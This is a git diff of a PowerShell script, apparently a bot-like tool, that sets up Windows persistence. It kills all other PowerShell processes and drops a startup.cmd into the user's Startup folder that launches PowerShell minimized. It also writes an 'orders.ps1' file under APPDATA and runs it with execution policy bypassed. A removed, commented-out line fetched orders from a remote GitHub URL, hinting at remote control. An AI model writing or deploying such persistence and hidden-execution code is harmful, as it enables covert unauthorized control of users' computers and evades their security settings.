@@ -10,11 +10,9 @@ echo "Process script starting: $Pid"
 #$newfile = "c:\test.txt" 
 #New-Item -Path $newfile -ItemType File -Force
 
-
 #\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run #TODO add startup.cmd here
 
-###
-
+### Kill all other ps process
 Get-Process -Name "*PowerShell*" | ForEach-Object {
     if($_.Id -ne $Pid){
         echo "process $_ killed"
@@ -22,9 +20,8 @@ Get-Process -Name "*PowerShell*" | ForEach-Object {
     }
 }
 
-###
-
-#$path = "C:\" #override
+### Create starup.cmd
+#[string]$path = "C:\"
 [string]$path = $env:APPDATA
 #[string]$FolderName = "\Test\"
 [string]$FolderName = "\Microsoft\Windows\Start Menu\Programs\Startup\"
@@ -39,10 +36,8 @@ New-Item -ItemType File -Path $StartupCmdPath -Force
 
 $path = $env:APPDATA #override
 $FolderName = "\Test\$Version\"
-
 $OrderPath = "$path"+"$FolderName"+"orders.ps1"
 $OrderPath
-
 #$ScriptPath = "$path"+"$FolderName"+"script.ps1"
 #$ScriptPath
 
@@ -51,8 +46,7 @@ $StartupCode = 'START /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell
 
 Add-Content $StartupCmdPath $StartupCode
 
-###
-
+### Create order
 $OrderCode = '
 #PowerShell.exe -windowstyle hidden {
 	echo "Process order starting: $Pid"
@@ -104,11 +98,7 @@ if(test-path($OrderPath)){
 New-Item -ItemType File -Path $OrderPath -Force
 Add-Content $OrderPath $OrderCode
 
-###
-
-#$orders = Invoke-WebRequest -URI "https://raw.githubusercontent.com/k4d4m/Obey/master/code" | Select -expand Content
-#$orders
-
+###Run order
 if(test-path($OrderPath)){
 	echo "invoking deployed order version: $Version"
 	powershell.exe -executionpolicy bypass -file "$OrderPath"
